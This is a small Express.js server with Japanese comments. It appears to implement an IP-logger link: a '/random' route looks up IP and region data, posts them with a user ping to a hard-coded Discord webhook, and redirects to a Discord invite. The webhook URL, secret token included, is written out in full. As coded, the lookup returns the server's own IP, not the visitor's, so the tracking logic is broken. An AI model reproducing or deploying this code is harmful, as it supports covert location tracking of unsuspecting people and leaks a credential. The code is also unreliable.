import express from "express";

const app = express();

app.get("/random", async (req, res) => {
  try {
    // 1. IP情報の取得
    const ipRes = await fetch("https://ipinfo.io/json");
    const got = await ipRes.json();

    if (!got.ip || !got.region) {
      console.error("IP情報の取得に失敗:", got);
      return res.status(500).send("Server error: failed to get IP info");
    }

    // 2. Discord Webhookへの送信
    const webhookResponse = await fetch("https://discord.com/api/webhooks/1467086114245574657/q8IPAwByCouW4LJ_uwbbtsT1X8zJ9vdYA-6dmClQFhHiLxWFe6UZ5Gm9FjdDy8FI9qnf", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ 
        content: `${got.ip} ${got.region} <@1238820524256268381>` 
      })
    });

    // Webhookの成否を確認
    if (!webhookResponse.ok) {
      const errorText = await webhookResponse.text();
      console.error("Webhook送信失敗:", webhookResponse.status, errorText);
      // 送信に失敗してもリダイレクトさせる場合はここを調整
    }

    // 3. リダイレクト
    return res.redirect("https://discord.gg/ctkp-aarr");

  } catch (err) {
    console.error("予期せぬエラー:", err);
    if (!res.headersSent) {
      res.status(500).send("Internal Server Error");
    }
  }
});

app.listen(3000, () => console.log("Server running on port 3000"));
